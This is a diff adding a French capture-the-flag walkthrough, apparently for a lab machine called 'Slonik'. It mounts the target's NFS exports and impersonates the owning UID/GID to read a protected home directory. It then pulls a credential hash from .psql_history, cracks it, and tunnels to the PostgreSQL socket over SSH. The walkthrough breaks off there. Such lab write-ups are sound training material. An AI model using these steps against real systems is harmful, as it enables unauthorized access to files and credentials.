@@ -1,0 +1,54 @@
+# Slonik
+
+## User
+
+showmount -e 10.129.234.160
+
+
+mkdir /tmp/nfs_mount
+sudo mount -t nfs 10.129.234.160:/var/backups /tmp/nfs_mount
+
+
+mkdir /tmp/nfs_mount_home
+sudo mount -t nfs 10.129.234.160:/home /tmp/nfs_mount_home/
+
+dans le dossier mkdir /tmp/nfs_mount_home : 
+on a un dossier service dont on ne peut pas entrer car nous n'avons pas les droits.
+Il suffit de creer un utilsiateur avec le meme GID 
+
+	ls -l
+		drwxr-x--- 5 CTF CTF 4096 22 sept. 14:46 service
+	ls -ln
+		drwxr-x--- 5 1337 1337 4096 22 sept. 14:46 service
+
+Creation du group et du user : 
+
+	sudo groupadd -g 1337 CTF
+	sudo useradd -u 1337 -g 1337 -m CTF
+
+
+
+Se connecter au nouveau compte : 
+	
+	su CTF
+
+
+
+
+Maintenant nous avons acces au dossier service.
+Il y dedans des fichier interessant mais le + interssant est .psql_history
+Ce fihcier contient un nom d'utilisateur et un mdp: 
+	service
+	aaabf0d39951f3e6c3e8a7911df524c2
+
+Le mot de passe est hashé en MD5, pour retrouvé le mot de passe on peut utiliser https://hashes.com/en/tools/hash_identifier
+Le mot de passe trouvé est :
+	service
+
+connexion ssh : 
+	ssh -N -L /tmp/.s.PGSQL.5432:/var/run/postgresql/.s.PGSQL.5432 service@10.129.97.79
+
+
+
+On arrive alors sur le serveur postgres.
+Pour affichier les databases
